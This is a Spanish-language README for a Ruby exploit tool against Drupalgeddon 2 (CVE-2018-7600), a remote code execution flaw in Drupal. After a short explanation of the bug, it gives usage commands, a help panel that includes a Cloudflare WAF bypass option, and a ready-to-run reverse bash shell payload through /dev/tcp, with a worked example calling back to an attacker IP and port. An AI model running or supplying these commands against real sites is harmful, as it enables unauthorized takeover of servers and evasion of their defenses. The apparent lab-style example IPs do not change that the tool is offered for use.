# Drupalgeddon 2.0 (CVE-2018–7600)

## ¿Qué es Drupalggeddon 2.0?

Se conoce como `Drupalgeddon 2.0` o `CVE-2018–7600` a una vulnerabilidad catalogada como altamente crítica que afecta a todas las versiones
de las ramas 6, 7 y 8 del gestor de contenidos `Drupal` y permite la ejecución de código remoto en el servidor que lo aloja.

Ya en 2014 se dio el primer Drupalgeddon, de ahí el 2.0. Es especialmente grave porque afecta a todas las versiones actuales de Drupal y su publicación se
hizo antes del parche que lo corrigiera, algo que normalmente no suele ocurrir. De hecho, inicialmente se publicó un parche que ha resultado no ser suficiente
y ha tenido que volver a ser parcheado. En palabras del propio grupo de seguridad de Drupal, el alcance es de más de un millón de sitios web 
vulnerables, y supone el 9% del total de páginas web conocidas que usan un CMS.

## ¿Cómo actua Drupalgeddon 2.0?

La causa principal de esta vulnerabilidad está relacionada con el sistema de representación de temas de Drupal. Para crear todos los elementos de la interfaz
de usuario, Drupal utiliza `Form API`, una poderosa herramienta que permite a los desarrolladores crear formularios y manejar los envíos de formularios de 
forma rápida y sencilla. Para lograr esto, la API utiliza una matriz asociativa jerárquica `Render Array` que contiene los datos que se renderizarán, así como 
algunas propiedades que establecen cómo se deben renderizar los datos.

* Para más información tecnica sobre su funcionamiento: <a href="https://michaelkoczwara.medium.com/drupalgeddon-2-b16c3095ae18" style="text-decoration:none">Link</a>


# Funciones Básicas:

Para ejecutar el exploit:

    ./drupalgeddon.rb [Dirección Web]
 
`Ejemplos:`

    ./drupalgeddon.rb http://ejemplo.com/

    ./drupalgeddon.rb http://10.10.10.10/

Podemos ver el panel de ayuda `-h` para ver las distintas opciones:

```
Usage example: ./drupalgeddon-customizable-beta.rb -u http://example.com/ -v 7 -c id  
More info: -h
   -u, --url URL               [Required] Service URL
   -v, --version VERSION       [Required] Target Drupal version {7,8}
   -c, --command COMMAND       [Required] Command to execute
   -m, --method PHP_METHOD     [Optional] PHP Method to use, by default: passthru
       --form                  [Optional] Form to attack, by default '/user/password' in Drupal 7 and '/user/register' in Drupal 8
       --cloudflare            [Optional] Tries to bypass Cloudflare using Lua-Nginx +100 parameters WAF Bypass
  -h, --help  

```

# Crear Shell Inversa Bash con Drupalgeddon2:

Para poder crear una reverse shell utilizando una `bash`, podemos especificar mediante `-c` el siguiente comando:

    ./drupalgeddon.rb [Dirección_Web_Víctima] -c "bash -c 'exec bash -i &>/dev/tcp/[Mi_IP]/[Mi_Puerto_De_Escucha] <&1'"

`Ejemplo:`
 
    ./drupalgeddon.rb http://10.10.10.59/ -c "bash -c 'exec bash -i &>/dev/tcp/10.10.14.26/4444 <&1'"    
